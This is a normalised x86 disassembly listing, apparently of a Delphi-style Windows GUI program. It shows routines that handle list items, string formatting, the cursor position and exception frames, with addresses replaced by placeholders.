lea eax [ ebp - 0x44 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x40 ]
xor edx edx
call sub_4d2728
jmp r-xdata
mov [ ebp - 0x104 ] 0x48
xor eax eax
lea edi [ esi + 0x8 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x1c ]
lea edx [ ebp - 0xc ]
call sub_41e604
lea edx [ ebp - 0x1c ]
inc [ ebp - 0xf8 ]
mov ecx [ edx ]
mov eax [ edi ]
xor edx edx
mov edi [ eax ]
call [ edi + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x8 ]
test ecx ecx
jle r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
mov ecx [ ebx + 0x18 ]
test ecx ecx
jle r-xdata
mov [ ebp - 0x104 ] 0x9c
mov edx rw-data
lea eax [ ebp - 0x58 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0x58 ]
push eax
xor ecx ecx
mov edx [ ebx + 0x1c ]
neg edx
mov [ ebp - 0x12c ] edx
mov [ ebp - 0x50 ] ecx
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0x50 ]
mov eax [ ebp - 0x12c ]
push eax
push rw-data
push edx
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x50 ]
inc [ ebp - 0xf8 ]
xor eax eax
mov [ ebp - 0x54 ] eax
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x54 ]
inc [ ebp - 0xf8 ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0x54 ]
xor edx edx
mov [ ebp - 0x5c ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x5c ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
lea edx [ ebp - 0x5c ]
lea eax [ ebp - 0x3c ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x5c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x58 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x54 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x50 ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x8 ]
test ecx ecx
jge r-xdata
add esi 0x8
mov [ ebp - 0x104 ] 0x54
mov edi [ ebx + 0x8 ]
xor eax eax
mov [ ebp - 0x24 ] eax
push edi
push rw-data
lea edx [ ebp - 0x24 ]
push edx
call sub_4d3324
add esp 0xc
lea ecx [ ebp - 0x24 ]
mov edx rw-data
lea eax [ ebp - 0x20 ]
push ecx
inc [ ebp - 0xf8 ]
call sub_4d3010
inc [ ebp - 0xf8 ]
xor ecx ecx
mov [ ebp - 0x28 ] ecx
lea ecx [ ebp - 0x28 ]
inc [ ebp - 0xf8 ]
pop edx
call sub_4d31c8
mov eax [ esi ]
lea ecx [ ebp - 0x28 ]
mov edx 0x1
mov ebx [ eax ]
mov ecx [ ecx ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
mov [ ebp - 0x104 ] 0x3c
add edi 0x4
mov eax [ ebp - 0x118 ]
inc [ ebp - 0x118 ]
mov edx [ ebx + eax * 4 + 0xc ]
push edx
call sub_40d614
pop ecx
mov [ ebp - 0x11c ] eax
lea eax [ ebp - 0x14 ]
xor ecx ecx
mov edx [ ebp - 0x11c ]
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0x14 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x10 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0x10 ]
inc [ ebp - 0xf8 ]
xor edx edx
mov [ ebp - 0x18 ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x18 ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
lea edx [ ebp - 0x18 ]
lea eax [ ebp - 0xc ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x18 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x14 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x10 ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x18 ]
test ecx ecx
jge r-xdata
mov [ ebp - 0x104 ] 0xa8
mov edx rw-data
lea eax [ ebp - 0x68 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0x68 ]
push eax
xor ecx ecx
mov edx [ ebx + 0x18 ]
mov [ ebp - 0x130 ] edx
mov [ ebp - 0x60 ] ecx
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0x60 ]
mov eax [ ebp - 0x130 ]
push eax
push rw-data
push edx
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x60 ]
inc [ ebp - 0xf8 ]
xor eax eax
mov [ ebp - 0x64 ] eax
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x64 ]
inc [ ebp - 0xf8 ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0x64 ]
xor edx edx
mov [ ebp - 0x6c ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x6c ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
lea edx [ ebp - 0x6c ]
lea eax [ ebp - 0x3c ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x6c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x68 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x64 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x60 ]
xor edx edx
call sub_4d2728
jmp r-xdata
mov [ ebp - 0x104 ] 0x6c
lea ebx [ esi + 0x8 ]
mov edx rw-data
lea eax [ ebp - 0x38 ]
call sub_4d3010
inc [ ebp - 0xf8 ]
mov ecx [ eax ]
mov eax [ ebx ]
mov edx 0x1
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
add esi 0x8
mov edx rw-data
mov [ ebp - 0x120 ] esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x104 ] 0x60
call sub_4d3128
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x30 ]
push ecx
mov eax [ ebx + 0x8 ]
neg eax
mov [ ebp - 0x124 ] eax
xor edx edx
mov [ ebp - 0x2c ] edx
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x124 ]
push ecx
push rw-data
push eax
call sub_4d3324
add esp 0xc
lea eax [ ebp - 0x2c ]
inc [ ebp - 0xf8 ]
xor edx edx
mov [ ebp - 0x34 ] edx
lea ecx [ ebp - 0x34 ]
inc [ ebp - 0xf8 ]
pop edx
call sub_4d31c8
mov eax [ ebp - 0x120 ]
lea ecx [ ebp - 0x34 ]
mov edx 0x1
mov eax [ eax ]
mov ecx [ ecx ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xc ]
xor edx edx
call sub_4d2728
jmp r-xdata
mov ecx [ ebx + 0x24 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x104 ] 0xb4
mov edx rw-data
lea eax [ ebp - 0x78 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0x78 ]
push eax
xor ecx ecx
mov edx [ ebx + 0x18 ]
neg edx
mov [ ebp - 0x134 ] edx
mov [ ebp - 0x70 ] ecx
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0x134 ]
push eax
push rw-data
push edx
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x70 ]
inc [ ebp - 0xf8 ]
xor eax eax
mov [ ebp - 0x74 ] eax
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x74 ]
inc [ ebp - 0xf8 ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0x74 ]
xor edx edx
mov [ ebp - 0x7c ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x7c ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
lea edx [ ebp - 0x7c ]
lea eax [ ebp - 0x3c ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x7c ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x78 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x74 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x70 ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x28 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x104 ] 0xc0
mov edx rw-data
lea eax [ ebp - 0x80 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0x80 ]
lea eax [ ebp - 0x3c ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x80 ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x2c ]
test ecx ecx
je r-xdata
mov [ ebp - 0x104 ] 0xcc
mov edx rw-data
lea eax [ ebp - 0x84 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0x84 ]
lea eax [ ebp - 0x3c ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x84 ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x20 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x104 ] 0xd8
mov edx rw-data
lea eax [ ebp - 0x88 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0x88 ]
lea eax [ ebp - 0x3c ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x88 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0x104 ] 0xf0
xor eax eax
lea edi [ esi + 0x8 ]
mov [ ebp - 0x9c ] eax
lea eax [ ebp - 0x9c ]
lea edx [ ebp - 0x3c ]
call sub_41e604
lea edx [ ebp - 0x9c ]
inc [ ebp - 0xf8 ]
mov ecx [ edx ]
mov eax [ edi ]
xor edx edx
mov edi [ eax ]
call [ edi + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x9c ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebx + 0x24 ]
test ecx ecx
jne r-xdata
mov [ ebp - 0x104 ] 0xe4
mov edx rw-data
lea eax [ ebp - 0x94 ]
xor ecx ecx
call sub_4d25d8
inc [ ebp - 0xf8 ]
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0x94 ]
push eax
xor ecx ecx
mov edx [ ebx + 0x20 ]
mov [ ebp - 0x138 ] edx
mov [ ebp - 0x8c ] ecx
inc [ ebp - 0xf8 ]
lea edx [ ebp - 0x8c ]
mov eax [ ebp - 0x138 ]
push eax
push rw-data
push edx
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x8c ]
inc [ ebp - 0xf8 ]
xor eax eax
mov [ ebp - 0x90 ] eax
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x90 ]
inc [ ebp - 0xf8 ]
mov eax rw-data
call sub_402d5c
lea eax [ ebp - 0x90 ]
xor edx edx
mov [ ebp - 0x98 ] edx
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0x98 ]
inc [ ebp - 0xf8 ]
pop edx
call sub_402e08
lea edx [ ebp - 0x98 ]
lea eax [ ebp - 0x3c ]
call sub_4d276c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x98 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x94 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x90 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x8c ]
xor edx edx
call sub_4d2728
mov ecx [ ebx + 0x8 ]
test ecx ecx
jle r-xdata
mov eax [ ebx + 0x28 ]
test eax eax
jne r-xdata
add esi 0x8
mov edx rw-data
mov [ ebp - 0x148 ] esi
lea eax [ ebp - 0xa8 ]
mov [ ebp - 0x104 ] 0x108
call sub_4d3010
inc [ ebp - 0xf8 ]
mov ecx [ eax ]
mov eax [ ebp - 0x148 ]
mov eax [ eax ]
mov edx 0x1
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xa8 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
add esi 0x8
xor edx edx
mov [ ebp - 0x13c ] esi
mov [ ebp - 0x104 ] 0xfc
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x144 ] eax
mov [ ebp - 0xa0 ] edx
inc [ ebp - 0xf8 ]
lea eax [ ebp - 0xa0 ]
mov ecx [ ebp - 0x144 ]
push ecx
push rw-data
push eax
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0xa0 ]
inc [ ebp - 0xf8 ]
mov [ ebp - 0x140 ] edx
xor ecx ecx
mov [ ebp - 0xa4 ] ecx
lea eax [ ebp - 0xa4 ]
mov edx [ ebp - 0x140 ]
call sub_41e604
inc [ ebp - 0xf8 ]
lea ecx [ ebp - 0xa4 ]
mov eax [ ebp - 0x13c ]
mov edx 0x1
mov ecx [ ecx ]
mov eax [ eax ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xa4 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xa0 ]
xor edx edx
call sub_4d2728
jmp r-xdata
mov edx [ ebx + 0x2c ]
test edx edx
je r-xdata
dec [ ebp - 0xf8 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0x3c ]
xor edx edx
call sub_4d2728
jmp r-xdata
mov [ ebp - 0x104 ] 0x114
lea ebx [ esi + 0x8 ]
mov edx rw-data
lea eax [ ebp - 0xac ]
call sub_4d3010
inc [ ebp - 0xf8 ]
mov ecx [ eax ]
mov eax [ ebx ]
mov edx 0x1
mov ebx [ eax ]
call [ ebx + 0x20 ]
dec [ ebp - 0xf8 ]
lea eax [ ebp - 0xac ]
mov edx 0x2
call sub_4d318c
sub_40bd20
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov eax [ ebx + 0x3d8 ]
call sub_4a42d8
mov edx [ rw-data ]
mov ecx [ edx ]
mov [ ecx + 0x470 ] eax
mov eax [ ebx + 0x3dc ]
call sub_4ac538
mov ecx [ rw-data ]
mov edx [ eax + 0x28 ]
mov edi rw-data
mov eax [ ecx ]
mov [ eax + 0x474 ] edx
xor edx edx
mov [ ebp - 0x18 ] 0xc
mov [ ebp - 0x4 ] edx
inc [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x18
mov eax [ ebx + 0x3dc ]
call sub_4ac538
mov esi eax
add esi 0x20
mov eax [ esi ]
test eax eax
je r-xdata
mov edx rw-data
mov edx [ esi ]
jmp r-xdata
push edx
mov eax [ ebx + 0x3d8 ]
call sub_4a42d8
inc eax
lea ecx [ ebp - 0x4 ]
push eax
push edi
push ecx
call sub_4d3324
add esp 0x10
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_48dfa0
mov ecx [ rw-data ]
mov eax [ ecx ]
mov edx [ eax ]
call [ edx + 0x100 ]
mov eax [ ebx + 0x3dc ]
call sub_4ac538
mov edx eax
mov eax ebx
call sub_40ab9c
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40be38
push ebx
push esi
mov esi eax
xor ebx ebx
jmp r-xdata
mov ecx [ esi + 0x3dc ]
mov eax [ ecx + 0x28c ]
call sub_4a81b8
cmp ebx eax
jl r-xdata
mov eax [ esi + 0x3dc ]
mov edx ebx
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax esi
call sub_40ab9c
inc ebx
pop esi
pop ebx
retn
sub_40be78
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx eax
mov eax rw-data
call sub_4c517c
mov eax [ ebx + 0x3d8 ]
call sub_4a42d8
mov edx [ rw-data ]
mov [ ebp - 0x34 ] eax
mov ecx [ edx + 0x8 ]
mov dl 0x1
mov [ ebp - 0x38 ] ecx
mov ecx ebx
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x1
mov eax [ rw-data ]
call sub_404364
mov edi eax
mov eax [ ebx + 0x3dc ]
call sub_4ac538
call sub_4a801c
mov esi eax
jmp r-xdata
mov ecx [ ebx + 0x3dc ]
mov eax [ ecx + 0x28c ]
call sub_4a81b8
cmp esi eax
jl r-xdata
mov [ ebp - 0x20 ] 0xc
xor eax eax
mov [ ebp - 0x4 ] eax
inc [ ebp - 0x14 ]
mov [ ebp - 0x20 ] 0x18
mov [ ebp - 0x3c ] rw-data
mov edx [ ebx + 0x3dc ]
mov eax [ edx + 0x28c ]
mov edx esi
call sub_4a81f0
add eax 0x20
mov [ ebp - 0x40 ] eax
mov ecx [ ebp - 0x40 ]
mov eax [ ecx ]
test eax eax
je r-xdata
mov esi edi
mov [ ebp - 0xc ] esi
test esi esi
je r-xdata
mov ecx rw-data
mov edx [ ebp - 0x40 ]
mov ecx [ edx ]
jmp r-xdata
mov eax [ ebx + 0x3dc ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x20 ] 0x3c
mov edx 0x3
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x20 ] 0x24
mov eax [ ebx + 0x3dc ]
mov edx esi
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax [ ebx + 0x3dc ]
call sub_4ac550
mov ecx [ ebx + 0x3dc ]
mov edx esi
mov eax [ ecx + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax [ ebx + 0x3dc ]
call sub_4ac63c
mov esi 0x64
jmp r-xdata
je r-xdata
push ecx
mov eax [ ebp - 0x34 ]
inc eax
push eax
mov edx [ ebp - 0x3c ]
push edx
lea eax [ ebp - 0x4 ]
push eax
call sub_4d3324
add esp 0x10
mov eax [ edi + 0x378 ]
mov edx [ ebp - 0x4 ]
call sub_48dfa0
mov eax edi
mov edx [ eax ]
call [ edx + 0x100 ]
mov ecx [ edi + 0x388 ]
sub ecx 0x1
jb r-xdata
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x0
call sub_40f818
mov eax [ ebx + 0x3dc ]
mov edx esi
mov eax [ eax + 0x28c ]
call sub_4a81f0
imul edx [ ebp - 0x34 ] 0x1a90
mov eax [ eax + 0x28 ]
mov ecx [ ebp - 0x38 ]
shl eax 0x2
add edx ecx
add edx 0x8
xor ecx ecx
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
add edx eax
mov eax edx
mov [ eax ] 0x1
mov edx [ edi + 0x38c ]
mov [ eax + 0xc ] edx
xor edx edx
mov [ eax + 0x10 ] ecx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] ecx
call sub_40d804
mov eax [ ebp - 0x38 ]
mov edx esi
mov [ eax ] 0x1
mov eax [ ebx + 0x3dc ]
mov eax [ eax + 0x28c ]
call sub_4a81f0
mov edx eax
mov eax ebx
call sub_40ab9c
call sub_40f8a0
jmp r-xdata
dec ecx
je r-xdata
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
jmp r-xdata
jmp r-xdata
inc esi
sub_40c0bc
or [ eax ] al
add [ eax ] al
add [ eax + edx ] al
add [ ebx + eax * 2 + 0x20040 ] bh
add [ eax ] al
push esp
push edi
imul edi [ edx + 0x61 ] 0x69446472
popad
insb
outsd
and [ bp + si ] ch
pop ebx
xor bl [ ebp ]
nop
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
xor eax eax
mov ebx rw-data
mov edi [ edx + 0x8 ]
mov [ ebp - 0x18 ] 0xc
mov [ ebp - 0x4 ] eax
inc [ ebp - 0xc ]
mov [ ebp - 0x18 ] 0x18
mov eax [ esi + 0x3d8 ]
call sub_4a42d8
inc eax
lea edx [ ebp - 0x4 ]
push eax
push ebx
push edx
call sub_4d3324
add esp 0xc
push 0x4
mov ecx rw-data
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx rw-data
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov [ ebp - 0x18 ] 0x18
xor ebx ebx
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
cmp eax 0x7
jne r-xdata
mov eax [ esi + 0x3d8 ]
call sub_4a42d8
imul eax eax 0x1a90
add eax edi
mov edx ebx
shl edx 0x2
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
add eax edx
add eax 0x8
call sub_40d6f0
inc ebx
cmp ebx 0x44
jl r-xdata
mov [ edi ] 0x1
mov eax esi
call sub_40a44c
dec [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp - 0x28 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c1d8
push ebx
push esi
add esp 0xffffffe8
mov ebx eax
xor eax eax
xor edx edx
mov [ esp + 0x4 ] eax
mov [ esp ] eax
mov [ esp + 0xc ] edx
mov [ esp + 0x8 ] edx
push esp
call GetCursorPos
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax [ ebx + 0x3dc ]
call sub_48dac0
mov ecx [ esp + 0x10 ]
mov [ esp + 0x8 ] ecx
mov ecx [ esp + 0x14 ]
mov [ esp + 0xc ] ecx
mov eax [ esp + 0xc ]
mov ecx eax
mov edx eax
mov eax [ ebx + 0x3dc ]
call sub_4ac7e0
mov esi eax
test esi esi
jne r-xdata
add esp 0x18
pop esi
pop ebx
retn
mov eax [ ebx + 0x3dc ]
mov esi [ eax + 0x28c ]
mov eax esi
call sub_4a81b8
mov edx eax
mov eax esi
dec edx
call sub_4a81f0
mov esi eax
mov eax [ ebx + 0x3dc ]
mov edx esi
call sub_4ac550
mov edx esi
mov eax [ ebx + 0x3dc ]
call sub_4ac63c
sub_40c274
push ebx
mov ebx eax
push esi
push edi
mov eax [ ebx + 0x3dc ]
call sub_4ac538
mov edi [ eax + 0x28 ]
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov eax [ ebx + 0x3d8 ]
call sub_4a42d8
imul eax eax 0x1a90
add eax esi
mov edx edi
shl edx 0x2
lea edx [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
add eax edx
add eax 0x8
call sub_40d6f0
mov [ esi ] 0x1
mov eax [ ebx + 0x3dc ]
call sub_4ac538
mov edx eax
mov eax ebx
call sub_40ab9c
pop edi
pop esi
pop ebx
retn
sub_40c2d4
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x34 ] eax
mov eax rw-data
call sub_4c517c
mov edx [ rw-data ]
xor eax eax
mov esi [ edx + 0x8 ]
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x20 ] 0xc
mov [ ebp - 0x20 ] 0x18
mov [ ebp - 0x8 ] eax
inc [ ebp - 0x14 ]
mov ecx [ ebp - 0x34 ]
mov eax [ ecx + 0x3f0 ]
call sub_48df68
lea eax [ ebp - 0x8 ]
call sub_4d3514
mov ebx eax
dec [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x0
jmp r-xdata
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x20 ] 0x30
xor edx edx
mov eax rw-data
mov [ ebp - 0xc ] edx
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x14 ]
mov [ ebp - 0x20 ] 0x3c
push 0x10
push eax
push ecx
call sub_4d3324
add esp 0xc
push 0x10
mov ecx rw-data
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
cmp ebx 0x10
jg r-xdata
mov edx rw-data
mov edx [ ebp - 0xc ]
jmp r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi ] 0x1
mov eax [ ebp - 0x34 ]
call sub_40a44c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0x3f0 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x0
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c36f
mov [ ebp - 0x20 ] 0x14
call sub_4d1d58
cmp ebx 0x1
jl r-xdata
mov [ ebp - 0x20 ] 0x30
xor edx edx
mov eax rw-data
mov [ ebp - 0xc ] edx
lea ecx [ ebp - 0xc ]
inc [ ebp - 0x14 ]
mov [ ebp - 0x20 ] 0x3c
push 0x10
push eax
push ecx
call sub_4d3324
add esp 0xc
push 0x10
mov ecx rw-data
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
cmp ebx 0x10
jg r-xdata
mov edx rw-data
mov edx [ ebp - 0xc ]
jmp r-xdata
mov [ esi + 0x4 ] ebx
mov [ esi ] 0x1
mov eax [ ebp - 0x34 ]
call sub_40a44c
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4826f8
mov edx [ ebp - 0x34 ]
mov eax [ edx + 0x3f0 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
dec [ ebp - 0x14 ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0x20 ] 0x0
mov ecx [ ebp - 0x30 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40c418
add al 0x0
add [ eax ] al
mov al [ 0xffffffffcc000c00 ]
rol [ eax ] 0x1
inc ebp
js r-xdata
add [ ebx + 0x55890457 ] cl
aam 0x89
dec ebp
cld
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x4 ]
push eax
push rw-data
push edx
call sub_4d3324
jo r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
dec ebp
add [ edx - 0x18 ] dl
jle r-xdata
imul ebp [ edi + 0x6e ] 0x55002620
mov ebp esp
push ebx
mov ebx eax
movzx eax [ ecx ]
cmp eax 0xd
jne r-xdata
mov edx [ eax ]
call [ edx + 0xdc ]
mov [ esi + 0x1a908 ] eax
mov [ esi ] 0x1
mov eax ebx
call sub_40a44c
pop esi
pop ebx
retn
add esp 0xc
lea ecx [ ebp - 0x4 ]
inc [ ebp - 0xc ]
mov edx [ ecx ]
